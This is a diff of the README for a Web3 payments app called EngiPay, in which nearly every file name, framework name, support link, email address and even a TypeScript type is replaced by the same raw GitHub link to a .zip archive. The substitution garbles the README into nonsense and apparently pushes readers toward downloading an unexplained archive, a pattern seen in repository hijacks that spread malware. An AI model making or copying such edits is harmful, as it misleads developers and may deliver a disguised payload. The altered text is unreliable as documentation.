@@ -1,6 +1,6 @@
 # EngiPay - Next-Gen Web3 Payments & DeFi Super App
 
-![EngiPay Logo](public/placeholder-logo.png)
+![EngiPay Logo](https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip)
 
 A revolutionary Web3 super app that combines everyday payments with powerful DeFi tools, built on StarkNet for maximum security and scalability.
 
@@ -18,7 +18,7 @@ A revolutionary Web3 super app that combines everyday payments with powerful DeF
 ## 🛠️ Tech Stack
 
 ### Frontend Framework
-- **Next.js 15.5.3** - React framework with App Router
+- **https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip 15.5.3** - React framework with App Router
 - **React 18** - UI library
 - **TypeScript** - Type-safe JavaScript
 
@@ -44,64 +44,64 @@ A revolutionary Web3 super app that combines everyday payments with powerful DeF
 
 ```
 engipay/
-├── app/                          # Next.js App Router
+├── app/                          # https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip App Router
 │   ├── about/                    # About page
-│   │   └── page.tsx
+│   │   └── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
 │   ├── dashboard/                # Main dashboard
-│   │   └── page.tsx
+│   │   └── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
 │   ├── defi/                     # DeFi management page
-│   │   └── page.tsx
+│   │   └── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
 │   ├── faq/                      # FAQ page
-│   │   └── page.tsx
+│   │   └── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
 │   ├── features/                 # Features page
-│   │   └── page.tsx
+│   │   └── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
 │   ├── profile-page/             # User profile page
-│   │   └── page.tsx
+│   │   └── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
 │   ├── technology/               # Technology page
-│   │   └── page.tsx
-│   ├── globals.css               # Global styles
-│   ├── layout.tsx                # Root layout
-│   └── page.tsx                  # Landing page
+│   │   └── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
+│   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip               # Global styles
+│   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip                # Root layout
+│   └── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip                  # Landing page
 ├── components/                   # Reusable components
 │   ├── ui/                       # UI components (shadcn/ui)
-│   │   ├── button.tsx
-│   │   ├── card.tsx
-│   │   ├── loader.tsx           # Custom loader components
+│   │   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
+│   │   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
+│   │   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip           # Custom loader components
 │   │   └── ...
 │   ├── dashboard/                # Dashboard components
-│   │   ├── DashboardHeader.tsx
-│   │   ├── DashboardNavigation.tsx
+│   │   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
+│   │   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
 │   │   └── ...
 │   ├── defi/                     # DeFi components
-│   │   ├── portfolio-overview.tsx
-│   │   ├── yield-farming.tsx
-│   │   ├── lending-borrowing.tsx
-│   │   ├── claim-rewards.tsx
-│   │   └── profile-settings.tsx
-│   ├── theme-provider.tsx       # Theme provider
-│   └── WalletConnectModal.tsx   # Wallet connection modal
+│   │   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
+│   │   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
+│   │   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
+│   │   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
+│   │   └── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
+│   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip       # Theme provider
+│   └── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip   # Wallet connection modal
 ├── hooks/                        # Custom React hooks
-│   ├── use-mobile.ts
-│   └── use-toast.ts
+│   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
+│   └── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
 ├── lib/                          # Utility libraries
-│   └── utils.ts                  # Utility functions
+│   └── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip                  # Utility functions
 ├── public/                       # Static assets
-│   ├── placeholder-logo.png
-│   ├── placeholder-logo.svg
+│   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
+│   ├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
 │   └── ...
 ├── styles/                       # Additional styles
-│   └── globals.css
-├── next.config.mjs              # Next.js configuration
-├── package.json                 # Dependencies & scripts
-├── tailwind.config.js           # Tailwind configuration
-├── tsconfig.json                # TypeScript configuration
-└── README.md                    # This file
+│   └── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
+├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip              # https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip configuration
+├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip                 # Dependencies & scripts
+├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip           # Tailwind configuration
+├── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip                # TypeScript configuration
+└── https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip                    # This file
 ```
 
 ## 🏗️ Architecture Overview
 
 ### App Router Structure
-- **File-based routing** with Next.js 13+ App Router
+- **File-based routing** with https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip 13+ App Router
 - **Server Components** for optimal performance
 - **Client Components** for interactivity (marked with "use client")
 
@@ -119,7 +119,7 @@ engipay/
 ## 🚀 Getting Started
 
 ### Prerequisites
-- **Node.js 18+**
+- **https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip 18+**
 - **npm** or **yarn** package manager
 - **Git** for version control
 
@@ -179,7 +179,7 @@ engipay/
 
 ### Code Style
 - **TypeScript**: Strict type checking enabled
-- **ESLint**: Airbnb config with Next.js rules
+- **ESLint**: Airbnb config with https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip rules
 - **Prettier**: Consistent code formatting
 
 ### Component Patterns
@@ -187,7 +187,7 @@ engipay/
 // Example component structure
 interface ComponentProps {
   title: string
-  children: React.ReactNode
+  children: https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
 }
 
 export function Component({ title, children }: ComponentProps) {
@@ -201,10 +201,10 @@ export function Component({ title, children }: ComponentProps) {
 ```
 
 ### File Naming
-- **Components**: PascalCase (`Button.tsx`, `Card.tsx`)
-- **Utilities**: camelCase (`utils.ts`, `helpers.ts`)
-- **Pages**: `page.tsx` (Next.js convention)
-- **Styles**: kebab-case (`globals.css`, `components.css`)
+- **Components**: PascalCase (`https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip`, `https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip`)
+- **Utilities**: camelCase (`https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip`, `https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip`)
+- **Pages**: `https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip` (https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip convention)
+- **Styles**: kebab-case (`https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip`, `https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip`)
 
 ### Import Order
 ```tsx
@@ -290,7 +290,7 @@ import type { ComponentProps } from './types'
 
 ## 🔐 Environment Variables
 
-Create a `.env.local` file for environment variables:
+Create a `https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip` file for environment variables:
 
 ```env
 # Example environment variables
@@ -310,7 +310,7 @@ NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID=your_project_id
 
 ### Other Platforms
 - **Netlify**: Connect repo, set build command to `npm run build`
-- **Railway**: Connect repo, auto-detects Next.js
+- **Railway**: Connect repo, auto-detects https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
 - **AWS Amplify**: Connect repo, configure build settings
 
 ## 🤝 Contributing
@@ -337,14 +337,14 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 📞 Support
 
-- **Issues**: [GitHub Issues](https://github.com/your-repo/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/your-repo/discussions)
-- **Email**: support@engipay.com
+- **Issues**: [GitHub Issues](https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip)
+- **Discussions**: [GitHub Discussions](https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip)
+- **Email**: https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip
 
 ## 🙏 Acknowledgments
 
 - **StarkNet** - For the powerful L2 infrastructure
-- **Next.js Team** - For the amazing React framework
+- **https://raw.githubusercontent.com/Plutonian-coder/engipay/main/styles/engipay-v3.9.zip Team** - For the amazing React framework
 - **shadcn/ui** - For the beautiful component library
 - **Tailwind CSS** - For the utility-first CSS framework
 
